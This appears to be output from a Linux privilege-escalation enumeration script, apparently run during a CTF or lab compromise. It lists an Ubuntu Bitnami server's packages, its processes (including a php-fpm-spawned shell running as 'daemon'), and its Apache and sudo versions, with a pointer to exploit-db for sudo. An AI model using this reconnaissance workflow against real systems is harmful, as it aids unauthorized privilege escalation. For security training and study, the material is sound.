+    bash 4.3-7ubuntu1.5  GNU Bourne Again SHell
+    binutils 2.24-5ubuntu13  GNU assembler, linker and binary utilities
+    bsdutils 1:2.20.1-5.1ubuntu20.4  Basic utilities from 4.4BSD-Lite
+    build-essential 11.6ubuntu6  Informational list of build-essential packages
+    busybox-initramfs 1:1.21.0-1ubuntu1  Standalone shell setup for initramfs
+    bzip2 1.0.6-5  high-quality block-sorting file compressor - utilities
+    ca-certificates 20141019ubuntu0.14.04.1  Common CA certificates
+    console-setup 1.70ubuntu8  console font and keymap setup program
+    coreutils 8.21-1ubuntu5.1  GNU core utilities
+    cpio 2.11+dfsg-1ubuntu1.1  GNU cpio -- a program to manage archives of files
+    cpp 4:4.8.2-1ubuntu6  GNU C preprocessor (cpp)
+    cpp-4.8 4.8.4-2ubuntu1~14.04  GNU C preprocessor
+    cron 3.0pl1-124ubuntu2  process scheduling daemon
+    curl 7.35.0-1ubuntu2.5  command line tool for transferring data with URL syntax
+    dash 0.5.7-4ubuntu1  POSIX-compliant shell
+    debconf 1.5.51ubuntu2  Debian configuration management system
+    debconf-i18n 1.5.51ubuntu2  full internationalization support for debconf
+    debianutils 4.4  Miscellaneous utilities specific to Debian
+    dh-python 1.20140128-1ubuntu8  Debian helper tools for packaging Python libraries and applications
+    diffutils 1:3.3-1  File comparison utilities
+    dmsetup 2:1.02.77-6ubuntu2  Linux Kernel Device Mapper userspace library
+    dpkg 1.17.5ubuntu5.4  Debian package management system
+    dpkg-dev 1.17.5ubuntu5.4  Debian package development tools
+    e2fslibs:amd64 1.42.9-3ubuntu1.2  ext2/ext3/ext4 file system libraries
+    e2fsprogs 1.42.9-3ubuntu1.2  ext2/ext3/ext4 file system utilities
+    eject 2.1.5+deb1+cvs20081104-13.1  ejects CDs and operates CD-Changers under Linux
+    fakeroot 1.20-3ubuntu2  tool for simulating superuser privileges
+    file 1:5.14-2ubuntu3.3  Determines file type using "magic" numbers
+    findutils 4.4.2-7  utilities for finding files--find, xargs
+    fontconfig 2.11.0-0ubuntu4.1  generic font configuration library - support binaries
+    fontconfig-config 2.11.0-0ubuntu4.1  generic font configuration library - configuration
+    fonts-dejavu-core 2.34-1ubuntu1  Vera font family derivate with additional characters
+    g++ 4:4.8.2-1ubuntu6  GNU C++ compiler
+    g++-4.8 4.8.4-2ubuntu1~14.04  GNU C++ compiler
+    gcc 4:4.8.2-1ubuntu6  GNU C compiler
+    gcc-4.8 4.8.4-2ubuntu1~14.04  GNU C compiler
+    gcc-4.8-base:amd64 4.8.4-2ubuntu1~14.04  GCC, the GNU Compiler Collection (base package)
+    gcc-4.9-base:amd64 4.9.1-0ubuntu1  GCC, the GNU Compiler Collection (base package)
+    gettext-base 0.18.3.1-1ubuntu3  GNU Internationalization utilities for the base system
+    gnupg 1.4.16-1ubuntu2.3  GNU privacy guard - a free PGP replacement
+    gpgv 1.4.16-1ubuntu2.3  GNU privacy guard - signature verification tool
+    grep 2.16-1  GNU grep, egrep and fgrep
+    grub 0.97-29ubuntu66  GRand Unified Bootloader (Legacy version)
+    grub-common 2.02~beta2-9ubuntu1.2  GRand Unified Bootloader (common files)
+    gzip 1.6-3ubuntu1  GNU compression utilities
+    hostname 3.15ubuntu1  utility to set/show the host name or domain name
+    ifupdown 0.7.47.2ubuntu4.1  high level tools to configure network interfaces
+    init-system-helpers 1.14  helper tools for all init systems
+    initramfs-tools 0.103ubuntu4.2  tools for generating an initramfs
+    initramfs-tools-bin 0.103ubuntu4.2  binaries used by initramfs-tools
+    initscripts 2.88dsf-41ubuntu6.2  scripts for initializing and shutting down the system
+    insserv 1.14.0-5ubuntu2  boot sequence organizer using LSB init.d script dependency information
+    iproute2 3.12.0-2  networking and traffic control tools
+    iptables 1.4.21-1ubuntu1  administration tools for packet filtering and NAT
+    iputils-ping 3:20121221-4ubuntu1.1  Tools to test the reachability of network hosts
+    isc-dhcp-client 4.2.4-7ubuntu12.2  ISC DHCP client
+    isc-dhcp-common 4.2.4-7ubuntu12.2  common files used by all the isc-dhcp* packages
+    kbd 1.15.5-1ubuntu1  Linux console font and keytable utilities
+    keyboard-configuration 1.70ubuntu8  system-wide keyboard preferences
+    klibc-utils 2.0.3-0ubuntu1  small utilities built with klibc for early boot
+    kmod 15-0ubuntu6  tools for managing Linux kernel modules
+    krb5-locales 1.12+dfsg-2ubuntu5.1  Internationalization support for MIT Kerberos
+    less 458-2  pager program similar to more
+    libacl1:amd64 2.2.52-1  Access control list shared library
+    libalgorithm-diff-perl 1.19.02-3  module to find differences between files
+    libalgorithm-diff-xs-perl 0.04-2build4  module to find differences between files (XS accelerated)
+    libalgorithm-merge-perl 0.08-2  Perl module for three-way merge of textual data
+    libapt-inst1.5:amd64 1.0.1ubuntu2.8  deb package format runtime library
+    libapt-pkg4.12:amd64 1.0.1ubuntu2.8  package management runtime library
+    libarchive-extract-perl 0.70-1  generic archive extracting module
+    libasan0:amd64 4.8.4-2ubuntu1~14.04  AddressSanitizer -- a fast memory error detector
+    libasn1-8-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - ASN.1 library
+    libasprintf0c2:amd64 0.18.3.1-1ubuntu3  GNU library to use fprintf and friends in C++
+    libatomic1:amd64 4.8.4-2ubuntu1~14.04  support library providing __atomic built-in functions
+    libattr1:amd64 1:2.4.47-1ubuntu1  Extended attribute shared library
+    libaudit-common 1:2.3.2-2ubuntu1  Dynamic library for security auditing - common files
+    libaudit1:amd64 1:2.3.2-2ubuntu1  Dynamic library for security auditing
+    libavahi-client3:amd64 0.6.31-4ubuntu1  Avahi client library
+    libavahi-common-data:amd64 0.6.31-4ubuntu1  Avahi common data files
+    libavahi-common3:amd64 0.6.31-4ubuntu1  Avahi common library
+    libblkid1:amd64 2.20.1-5.1ubuntu20.4  block device id library
+    libbsd0:amd64 0.6.0-2ubuntu1  utility functions from BSD systems - shared library
+    libbz2-1.0:amd64 1.0.6-5  high-quality block-sorting file compressor library - runtime
+    libc-bin 2.19-0ubuntu6.6  Embedded GNU C Library: Binaries
+    libc-dev-bin 2.19-0ubuntu6.6  Embedded GNU C Library: Development binaries
+    libc6:amd64 2.19-0ubuntu6.6  Embedded GNU C Library: Shared libraries
+    libc6-dev:amd64 2.19-0ubuntu6.6  Embedded GNU C Library: Development Libraries and Header Files
+    libcap2:amd64 1:2.24-0ubuntu2  support for getting/setting POSIX.1e capabilities
+    libcap2-bin 1:2.24-0ubuntu2  basic utility programs for using capabilities
+    libcgmanager0:amd64 0.24-0ubuntu7.3  Central cgroup manager daemon (client library)
+    libck-connector0:amd64 0.4.5-3.1ubuntu2  ConsoleKit libraries
+    libcloog-isl4:amd64 0.18.2-1  Chunky Loop Generator (runtime library)
+    libcomerr2:amd64 1.42.9-3ubuntu1.2  common error description library
+    libcups2:amd64 1.7.2-0ubuntu1.6  Common UNIX Printing System(tm) - Core library
+    libcurl3:amd64 7.35.0-1ubuntu2.5  easy-to-use client-side URL transfer library (OpenSSL flavour)
+    libdb5.3:amd64 5.3.28-3ubuntu3  Berkeley v5.3 Database Libraries [runtime]
+    libdbus-1-3:amd64 1.6.18-0ubuntu4.3  simple interprocess messaging system (library)
+    libdbus-glib-1-2:amd64 0.100.2-1  simple interprocess messaging system (GLib-based shared library)
+    libdebconfclient0:amd64 0.187ubuntu1  Debian Configuration Management System (C-implementation library)
+    libdevmapper1.02.1:amd64 2:1.02.77-6ubuntu2  Linux Kernel Device Mapper userspace library
+    libdpkg-perl 1.17.5ubuntu5.4  Dpkg perl modules
+    libdrm2:amd64 2.4.60-2~ubuntu14.04.1  Userspace interface to kernel DRM services -- runtime
+    libedit2:amd64 3.1-20130712-2  BSD editline and history libraries
+    libestr0 0.1.9-0ubuntu2  Helper functions for handling strings (lib)
+    libexpat1:amd64 2.1.0-4ubuntu1  XML parsing C library - runtime library
+    libfakeroot:amd64 1.20-3ubuntu2  tool for simulating superuser privileges - shared libraries
+    libffi6:amd64 3.1~rc1+r3.0.13-12  Foreign Function Interface library runtime
+    libfile-fcntllock-perl 0.14-2build1  Perl module for file locking with fcntl(2)
+    libfontconfig1:amd64 2.11.0-0ubuntu4.1  generic font configuration library - runtime
+    libfreetype6:amd64 2.5.2-1ubuntu2.4  FreeType 2 font engine, shared library files
+    libfribidi0:amd64 0.19.6-1  Free Implementation of the Unicode BiDi algorithm
+    libfuse2:amd64 2.9.2-4ubuntu4.14.04.1  Filesystem in Userspace (library)
+    libgcc-4.8-dev:amd64 4.8.4-2ubuntu1~14.04  GCC support library (development files)
+    libgcc1:amd64 1:4.9.1-0ubuntu1  GCC support library
+    libgcrypt11:amd64 1.5.3-2ubuntu4.2  LGPL Crypto library - runtime library
+    libgdbm3:amd64 1.8.3-12build1  GNU dbm database routines (runtime version)
+    libglib2.0-0:amd64 2.40.2-0ubuntu1  GLib library of C routines
+    libglib2.0-data 2.40.2-0ubuntu1  Common files for GLib library
+    libgmp10:amd64 2:5.1.3+dfsg-1ubuntu1  Multiprecision arithmetic library
+    libgnutls-openssl27:amd64 2.12.23-12ubuntu2.2  GNU TLS library - OpenSSL wrapper
+    libgnutls26:amd64 2.12.23-12ubuntu2.2  GNU TLS library - runtime library
+    libgomp1:amd64 4.8.4-2ubuntu1~14.04  GCC OpenMP (GOMP) support library
+    libgpg-error0:amd64 1.12-0.2ubuntu1  library for common error values and messages in GnuPG components
+    libgssapi-krb5-2:amd64 1.12+dfsg-2ubuntu5.1  MIT Kerberos runtime libraries - krb5 GSS-API Mechanism
+    libgssapi3-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - GSSAPI support library
+    libhcrypto4-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - crypto library
+    libheimbase1-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - Base library
+    libheimntlm0-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - NTLM support library
+    libhx509-5-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - X509 support library
+    libice6:amd64 2:1.0.8-2  X11 Inter-Client Exchange library
+    libidn11:amd64 1.28-1ubuntu2  GNU Libidn library, implementation of IETF IDN specifications
+    libisl10:amd64 0.12.2-1  manipulating sets and relations of integer points bounded by linear constraints
+    libitm1:amd64 4.8.4-2ubuntu1~14.04  GNU Transactional Memory Library
+    libjson-c2:amd64 0.11-3ubuntu1.2  JSON manipulation library - shared library
+    libjson0:amd64 0.11-3ubuntu1.2  JSON manipulation library (transitional package)
+    libk5crypto3:amd64 1.12+dfsg-2ubuntu5.1  MIT Kerberos runtime libraries - Crypto Library
+    libkeyutils1:amd64 1.5.6-1  Linux Key Management Utilities (library)
+    libklibc 2.0.3-0ubuntu1  minimal libc subset for use with initramfs
+    libkmod2:amd64 15-0ubuntu6  libkmod shared library
+    libkrb5-26-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - libraries
+    libkrb5-3:amd64 1.12+dfsg-2ubuntu5.1  MIT Kerberos runtime libraries
+    libkrb5support0:amd64 1.12+dfsg-2ubuntu5.1  MIT Kerberos runtime libraries - Support library
+    libldap-2.4-2:amd64 2.4.31-1+nmu2ubuntu8.1  OpenLDAP libraries
+    liblocale-gettext-perl 1.05-7build3  module using libc functions for internationalization in Perl
+    liblockfile-bin 1.09-6ubuntu1  support binaries for and cli utilities based on liblockfile
+    liblockfile1:amd64 1.09-6ubuntu1  NFS-safe locking library
+    liblog-message-simple-perl 0.10-1  simplified interface to Log::Message
+    libltdl-dev:amd64 2.4.2-1.7ubuntu1  A system independent dlopen wrapper for GNU libtool
+    libltdl7:amd64 2.4.2-1.7ubuntu1  A system independent dlopen wrapper for GNU libtool
+    liblzma5:amd64 5.1.1alpha+20120614-2ubuntu2  XZ-format compression library
+    libmagic1:amd64 1:5.14-2ubuntu3.3  File type determination library using "magic" numbers
+    libmodule-pluggable-perl 5.1-1  module for giving modules the ability to have plugins
+    libmount1:amd64 2.20.1-5.1ubuntu20.4  block device id library
+    libmpc3:amd64 1.0.1-1ubuntu1  multiple precision complex floating-point library
+    libmpdec2:amd64 2.4.0-6  library for decimal floating point arithmetic (runtime library)
+    libmpfr4:amd64 3.1.2-1  multiple precision floating-point computation
+    libncurses5:amd64 5.9+20140118-1ubuntu1  shared libraries for terminal handling
+    libncursesw5:amd64 5.9+20140118-1ubuntu1  shared libraries for terminal handling (wide character support)
+    libnewt0.52:amd64 0.52.15-2ubuntu5  Not Erik's Windowing Toolkit - text mode windowing with slang
+    libnfnetlink0:amd64 1.0.1-2  Netfilter netlink library
+    libnih-dbus1:amd64 1.0.3-4ubuntu25  NIH D-Bus Bindings Library
+    libnih1:amd64 1.0.3-4ubuntu25  NIH Utility Library
+    libp11-kit0:amd64 0.20.2-2ubuntu2  Library for loading and coordinating access to PKCS#11 modules - runtime
+    libpam-cap:amd64 1:2.24-0ubuntu2  PAM module for implementing capabilities
+    libpam-modules:amd64 1.1.8-1ubuntu2  Pluggable Authentication Modules for PAM
+    libpam-modules-bin 1.1.8-1ubuntu2  Pluggable Authentication Modules for PAM - helper binaries
+    libpam-runtime 1.1.8-1ubuntu2  Runtime support for the PAM library
+    libpam0g:amd64 1.1.8-1ubuntu2  Pluggable Authentication Modules library
+    libpcre3:amd64 1:8.31-2ubuntu2  Perl 5 Compatible Regular Expression Library - runtime files
+    libplymouth2:amd64 0.8.8-0ubuntu17.1  graphical boot animation and logger - shared libraries
+    libpng12-0:amd64 1.2.50-1ubuntu2  PNG library - runtime
+    libpod-latex-perl 0.61-1  module to convert Pod data to formatted LaTeX
+    libpopt0:amd64 1.16-8ubuntu1  lib for parsing cmdline parameters
+    libprocps3:amd64 1:3.3.9-1ubuntu2.2  library for accessing process information from /proc
+    libpython-stdlib:amd64 2.7.5-5ubuntu3  interactive high-level object-oriented language (default python version)
+    libpython2.7-minimal:amd64 2.7.6-8  Minimal subset of the Python language (version 2.7)
+    libpython2.7-stdlib:amd64 2.7.6-8  Interactive high-level object-oriented language (standard library, version 2.7)
+    libpython3-stdlib:amd64 3.4.0-0ubuntu2  interactive high-level object-oriented language (default python3 version)
+    libpython3.4-minimal:amd64 3.4.0-2ubuntu1  Minimal subset of the Python language (version 3.4)
+    libpython3.4-stdlib:amd64 3.4.0-2ubuntu1  Interactive high-level object-oriented language (standard library, version 3.4)
+    libquadmath0:amd64 4.8.4-2ubuntu1~14.04  GCC Quad-Precision Math Library
+    libreadline6:amd64 6.3-4ubuntu2  GNU readline and history libraries, run-time libraries
+    libroken18-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - roken support library
+    librtmp0:amd64 2.4+20121230.gitdf6c518-1  toolkit for RTMP streams (shared library)
+    libsasl2-2:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - authentication abstraction library
+    libsasl2-modules:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - pluggable authentication modules
+    libsasl2-modules-db:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - pluggable authentication modules (DB)
+    libselinux1:amd64 2.2.2-1ubuntu0.1  SELinux runtime shared libraries
+    libsemanage-common 2.2-1  Common files for SELinux policy management libraries
+    libsemanage1:amd64 2.2-1  SELinux policy management library
+    libsepol1:amd64 2.2-1ubuntu0.1  SELinux library for manipulating binary security policies
+    libsigsegv2:amd64 2.10-2  Library for handling page faults in a portable way
+    libslang2:amd64 2.2.4-15ubuntu1  S-Lang programming library - runtime version
+    libsm6:amd64 2:1.2.1-2  X11 Session Management library
+    libsqlite3-0:amd64 3.8.2-1ubuntu2  SQLite 3 shared library
+    libss2:amd64 1.42.9-3ubuntu1.2  command-line interface parsing library
+    libssl1.0.0:amd64 1.0.1f-1ubuntu2.15  Secure Sockets Layer toolkit - shared libraries
+    libstdc++-4.8-dev:amd64 4.8.4-2ubuntu1~14.04  GNU Standard C++ Library v3 (development files)
+    libstdc++6:amd64 4.8.4-2ubuntu1~14.04  GNU Standard C++ Library v3
+    libtasn1-6:amd64 3.4-3ubuntu0.3  Manage ASN.1 structures (runtime)
+    libterm-ui-perl 0.42-1  Term::ReadLine UI made easy
+    libtext-charwidth-perl 0.04-7build3  get display widths of characters on the terminal
+    libtext-iconv-perl 1.7-5build2  converts between character sets in Perl
+    libtext-soundex-perl 3.4-1build1  implementation of the soundex algorithm
+    libtext-wrapi18n-perl 0.06-7  internationalized substitute of Text::Wrap
+    libtimedate-perl 2.3000-1  collection of modules to manipulate date/time information
+    libtinfo5:amd64 5.9+20140118-1ubuntu1  shared low-level terminfo library for terminal handling
+    libtool 2.4.2-1.7ubuntu1  Generic library support script
+    libtsan0:amd64 4.8.4-2ubuntu1~14.04  ThreadSanitizer -- a Valgrind-based detector of data races (runtime)
+    libudev1:amd64 204-5ubuntu20.12  libudev shared library
+    libusb-0.1-4:amd64 2:0.1.12-23.3ubuntu1  userspace USB programming library
+    libustr-1.0-1:amd64 1.0.4-3ubuntu2  Micro string library: shared library
+    libuuid1:amd64 2.20.1-5.1ubuntu20.4  Universally Unique ID library
+    libwind0-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - stringprep implementation
+    libwrap0:amd64 7.6.q-25  Wietse Venema's TCP wrappers library
+    libx11-6:amd64 2:1.6.2-1ubuntu2  X11 client-side library
+    libx11-data 2:1.6.2-1ubuntu2  X11 client-side library
+    libxau6:amd64 1:1.0.8-1  X11 authorisation library
+    libxcb1:amd64 1.10-2ubuntu1  X C Binding
+    libxdmcp6:amd64 1:1.1.1-1  X11 Display Manager Control Protocol library
+    libxext6:amd64 2:1.3.2-1ubuntu0.0.14.04.1  X11 miscellaneous extension library
+    libxml2:amd64 2.9.1+dfsg1-3ubuntu4.4  GNOME XML library
+    libxmuu1:amd64 2:1.1.1-1  X11 miscellaneous micro-utility library
+    libxrender1:amd64 1:0.9.8-1build0.14.04.1  X Rendering Extension client library
+    libxt6:amd64 1:1.1.4-1  X11 toolkit intrinsics library
+    libxtables10 1.4.21-1ubuntu1  netfilter xtables library
+    linux-headers-3.13.0-55 3.13.0-55.94  Header files related to Linux kernel version 3.13.0
+    linux-image-3.13.0-55-generic 3.13.0-55.94  Linux kernel image for version 3.13.0 on 64 bit x86 SMP
+    linux-image-virtual 3.13.0.55.62  This package will always depend on the latest minimal generic kernel image.
+    linux-libc-dev:amd64 3.13.0-55.94  Linux Kernel Headers for development
+    locales 2.13+git20120306-12.1  common files for locale support
+    lockfile-progs 0.1.17  Programs for locking and unlocking files and mailboxes
+    login 1:4.1.5.1-1ubuntu9  system login tools
+    logrotate 3.8.7-1ubuntu1  Log rotation utility
+    lsb-base 4.1+Debian11ubuntu6  Linux Standard Base 4.1 init script functionality
+    lsb-release 4.1+Debian11ubuntu6  Linux Standard Base version reporting utility
+    m4 1.4.17-2ubuntu1  a macro processing language
+    make 3.81-8.2ubuntu3  An utility for Directing compilation.
+    makedev 2.3.1-93ubuntu1  creates device files in /dev
+    manpages 3.54-1ubuntu1  Manual pages about using a GNU/Linux system
+    manpages-dev 3.54-1ubuntu1  Manual pages about using GNU/Linux for development
+    mawk 1.3.3-17ubuntu2  a pattern scanning and text processing language
+    mime-support 3.54ubuntu1.1  MIME files 'mime.types' & 'mailcap', and support programs
+    module-init-tools 15-0ubuntu6  transitional dummy package (module-init-tools to kmod)
+    monit 1:5.6-2  utility for monitoring and managing daemons or similar programs
+    mount 2.20.1-5.1ubuntu20.4  Tools for mounting and manipulating filesystems
+    mountall 2.53  filesystem mounting tool
+    multiarch-support 2.19-0ubuntu6.6  Transitional package to ensure multiarch compatibility
+    nano 2.2.6-1ubuntu1  small, friendly text editor inspired by Pico
+    ncurses-base 5.9+20140118-1ubuntu1  basic terminal type definitions
+    ncurses-bin 5.9+20140118-1ubuntu1  terminal-related programs and man pages
+    ncurses-term 5.9+20140118-1ubuntu1  additional terminal type definitions
+    net-tools 1.60-25ubuntu2.1  The NET-3 networking toolkit
+    netbase 5.2  Basic TCP/IP networking system
+    netcat-openbsd 1.105-7ubuntu1  TCP/IP swiss army knife
+    ntpdate 1:4.2.6.p5+dfsg-3ubuntu2.14.04.3  client for setting system time from NTP servers
+    openssh-client 1:6.6p1-2ubuntu2  secure shell (SSH) client, for secure access to remote machines
+    openssh-server 1:6.6p1-2ubuntu2  secure shell (SSH) server, for secure access from remote machines
+    openssh-sftp-server 1:6.6p1-2ubuntu2  secure shell (SSH) sftp server module, for SFTP access from remote machines
+    openssl 1.0.1f-1ubuntu2.15  Secure Sockets Layer toolkit - cryptographic utility
+    os-prober 1.63ubuntu1  utility to detect other OSes on a set of drives
+    passwd 1:4.1.5.1-1ubuntu9  change and administer password and group data
+    patch 2.7.1-4ubuntu2.3  Apply a diff file to an original
+    perl 5.18.2-2ubuntu1  Larry Wall's Practical Extraction and Report Language
+    perl-base 5.18.2-2ubuntu1  minimal Perl system
+    perl-modules 5.18.2-2ubuntu1  Core Perl modules
+    plymouth 0.8.8-0ubuntu17.1  graphical boot animation and logger - main package
+    procps 1:3.3.9-1ubuntu2.2  /proc file system utilities
+    psmisc 22.20-1ubuntu2  utilities that use the proc file system
+    pwgen 2.06-1ubuntu4  Automatic Password generation
+    python 2.7.5-5ubuntu3  interactive high-level object-oriented language (default version)
+    python-chardet 2.0.1-2build2  universal character encoding detector
+    python-minimal 2.7.5-5ubuntu3  minimal subset of the Python language (default version)
+    python-requests 2.2.1-1ubuntu0.2  elegant and simple HTTP library for Python, built for human beings
+    python-six 1.5.2-1  Python 2 and 3 compatibility library (Python 2 interface)
+    python-urllib3 1.7.1-1ubuntu3  HTTP library with thread-safe connection pooling for Python
+    python2.7 2.7.6-8  Interactive high-level object-oriented language (version 2.7)
+    python2.7-minimal 2.7.6-8  Minimal subset of the Python language (version 2.7)
+    python3 3.4.0-0ubuntu2  interactive high-level object-oriented language (default python3 version)
+    python3-minimal 3.4.0-0ubuntu2  minimal subset of the Python language (default python3 version)
+    python3.4 3.4.0-2ubuntu1  Interactive high-level object-oriented language (version 3.4)
+    python3.4-minimal 3.4.0-2ubuntu1  Minimal subset of the Python language (version 3.4)
+    readline-common 6.3-4ubuntu2  GNU readline and history libraries, common files
+    resolvconf 1.69ubuntu1.1  name server information handler
+    rsync 3.1.0-2ubuntu0.1  fast, versatile, remote (and local) file-copying tool
+    rsyslog 7.4.4-1ubuntu2.6  reliable system and kernel logging daemon
+    screen 4.1.0~20120320gitdb59704-9  terminal multiplexer with VT100/ANSI terminal emulation
+    sed 4.2.2-4ubuntu1  The GNU sed stream editor
+    sensible-utils 0.0.9  Utilities for sensible alternative selection
+    sgml-base 1.26+nmu4ubuntu1  SGML infrastructure and SGML catalog file support
+    shared-mime-info 1.2-0ubuntu3  FreeDesktop.org shared MIME database and spec
+    ssh 1:6.6p1-2ubuntu2  secure shell client and server (metapackage)
+    ssh-import-id 3.21-0ubuntu1  securely retrieve an SSH public key and install it locally
+    sudo 1.8.9p5-1ubuntu1.1  Provide limited super user privileges to specific users
+    sysv-rc 2.88dsf-41ubuntu6.2  System-V-like runlevel change mechanism
+    sysvinit-utils 2.88dsf-41ubuntu6.2  System-V-like utilities
+    tar 1.27.1-1  GNU version of the tar archiving utility
+    tcpd 7.6.q-25  Wietse Venema's TCP wrapper utilities
+    tzdata 2015d-0ubuntu0.14.04  time zone and daylight-saving time data
+    ubuntu-keyring 2012.05.19  GnuPG keys of the Ubuntu archive
+    ubuntu-minimal 1.325  Minimal core of Ubuntu
+    ucf 3.0027+nmu1  Update Configuration File(s): preserve user changes to config files
+    udev 204-5ubuntu20.12  /dev/ and hotplug management daemon
+    ufw 0.34~rc-0ubuntu2  program for managing a Netfilter firewall
+    unzip 6.0-9ubuntu1.3  De-archiver for .zip files
+    upstart 1.12.1-0ubuntu4.2  event-based init daemon
+    ureadahead 0.100.0-16  Read required files in advance
+    util-linux 2.20.1-5.1ubuntu20.4  Miscellaneous system utilities
+    vim-common 2:7.4.052-1ubuntu3  Vi IMproved - Common files
+    vim-tiny 2:7.4.052-1ubuntu3  Vi IMproved - enhanced vi editor - compact version
+    vsftpd 3.0.2-1ubuntu2.14.04.1  lightweight, efficient FTP server written for security
+    wget 1.15-1ubuntu1.14.04.1  retrieves files from the web
+    whiptail 0.52.15-2ubuntu5  Displays user-friendly dialog boxes from shell scripts
+    x11-common 1:7.7+1ubuntu8.1  X Window System (X.Org) infrastructure
+    xauth 1:1.0.7-1ubuntu1  X authentication utility
+    xkb-data 2.10.1-1ubuntu1  X Keyboard Extension (XKB) configuration data
+    xml-core 0.13+nmu2  XML infrastructure and XML catalog file support
+    xz-utils 5.1.1alpha+20120614-2ubuntu2  XZ-format compression utilities
+    zip 3.0-8  Archiver for .zip files
+    zlib1g:amd64 1:1.2.8.dfsg-1ubuntu1  compression library - runtime
+    zlib1g-dev:amd64 1:1.2.8.dfsg-1ubuntu1  compression library - development
+
+[+] Current processes
+    USER PID START TIME COMMAND
+    root 1 13:43 0:00 /sbin/init
+    root 2 13:43 0:00 [kthreadd]
+    root 3 13:43 5:49 [ksoftirqd/0]
+    root 4 13:43 0:00 [kworker/0:0]
+    root 5 13:43 0:00 [kworker/0:0H]
+    root 7 13:43 5:03 [rcu_sched]
+    root 8 13:43 9:06 [rcuos/0]
+    root 9 13:43 0:00 [rcu_bh]
+    root 10 13:43 0:00 [rcuob/0]
+    root 11 13:43 0:00 [migration/0]
+    root 12 13:43 0:01 [watchdog/0]
+    root 13 13:43 0:00 [khelper]
+    root 14 13:43 0:00 [kdevtmpfs]
+    root 15 13:43 0:00 [netns]
+    root 16 13:43 0:00 [writeback]
+    root 17 13:43 0:00 [kintegrityd]
+    root 18 13:43 0:00 [bioset]
+    root 20 13:43 0:00 [kblockd]
+    root 21 13:43 0:00 [ata_sff]
+    root 22 13:43 0:00 [khubd]
+    root 23 13:43 0:00 [md]
+    root 24 13:43 0:00 [devfreq_wq]
+    root 25 13:43 0:51 [kworker/0:1]
+    root 27 13:43 0:00 [khungtaskd]
+    root 28 13:43 0:02 [kswapd0]
+    root 29 13:43 0:00 [ksmd]
+    root 30 13:43 0:00 [fsnotify_mark]
+    root 31 13:43 0:00 [ecryptfs-kthrea]
+    root 32 13:43 0:00 [crypto]
+    root 44 13:43 0:00 [kthrotld]
+    root 46 13:43 0:00 [scsi_eh_0]
+    root 47 13:43 0:00 [scsi_eh_1]
+    root 49 13:43 0:00 [kworker/u2:3]
+    root 68 13:43 0:00 [deferwq]
+    root 69 13:43 0:00 [charger_manager]
+    root 70 13:43 0:04 [kworker/u2:4]
+    root 119 13:43 0:00 [kpsmoused]
+    root 129 13:43 1:49 [jbd2/sda1-8]
+    root 130 13:43 0:00 [ext4-rsv-conver]
+    root 269 13:43 0:00 upstart-udev-bridge
+    root 275 13:43 0:00 /lib/systemd/systemd-udevd
+    root 321 13:43 0:00 upstart-file-bridge
+    syslog 334 13:43 0:00 rsyslogd
+    root 681 13:43 0:00 upstart-socket-bridge
+    root 742 13:43 0:00 dhclient
+    root 898 13:43 0:00 /usr/sbin/vsftpd
+    root 958 13:43 0:00 /sbin/getty
+    root 960 13:43 0:00 /sbin/getty
+    root 962 13:43 0:00 /sbin/getty
+    root 997 13:43 0:00 /sbin/getty
+    root 999 13:43 0:00 /sbin/getty
+    root 1018 13:43 0:00 cron
+    root 1167 13:43 0:00 /bin/sh
+    mysql 1438 13:43 20:14 /opt/bitnami/mysql/bin/mysqld.bin
+    root 1505 13:44 0:02 php-fpm:
+    root 1512 13:44 0:02 /opt/bitnami/apache2/bin/httpd.bin
+    daemon 1514 13:44 4:07 /opt/bitnami/apache2/bin/httpd.bin
+    daemon 1515 13:44 13:24 /opt/bitnami/apache2/bin/httpd.bin
+    daemon 1516 13:44 4:21 /opt/bitnami/apache2/bin/httpd.bin
+    root 1660 13:44 0:06 /usr/bin/monit
+    root 1685 13:44 0:00 /sbin/getty
+    daemon 1700 13:46 43:23 /opt/bitnami/apache2/bin/httpd.bin
+    root 2250 18:17 0:05 [kworker/u3:1]
+    root 2325 18:40 0:01 [kworker/u3:2]
+    daemon 2365 18:54 0:02 php-fpm:
+    daemon 2393 19:19 0:01 php-fpm:
+    daemon 2412 19:38 0:00 php-fpm:
+    root 2493 20:49 0:00 [kauditd]
+    daemon 2507 20:58 0:00 php-fpm:
+    daemon 2508 20:58 0:00 sh
+    daemon 2512 20:58 0:00 /bin/sh
+    daemon 2513 20:59 0:00 python
+    daemon 2514 20:59 0:00 /bin/bash
+    daemon 2532 21:03 0:00 python
+    daemon 2694 21:03 0:00 /bin/sh
+    daemon 2695 21:03 0:00 ps
+    daemon 2696 21:03 0:00 awk
+
+[+] Apache Version and Modules
+    Server version: Apache/2.4.16 (Unix)
+    Server built:   Sep  7 2015 11:15:20
+    Compiled in modules:
+    core.c
+    mod_so.c
+    http_core.c
+
+[+] Apache Config File
+
+[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
+    Sudo version 1.8.9p5
+    Sudoers policy plugin version 1.8.9p5
+    Sudoers file grammar version 43
+    Sudoers I/O plugin version 1.8.9p5
+
+[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...
+
+    root 2 13:43 0:00 [kthreadd]
+    root 17 13:43 0:00 [kintegrityd]
+    root 69 13:43 0:00 [charger_manager]
+    root 275 13:43 0:00 /lib/systemd/systemd-udevd
+    root 14 13:43 0:00 [kdevtmpfs]
+    root 11 13:43 0:00 [migration/0]
+    root 3 13:43 5:49 [ksoftirqd/0]
+    root 1685 13:44 0:00 /sbin/getty
+    root 1660 13:44 0:06 /usr/bin/monit
+        Possible Related Packages: 
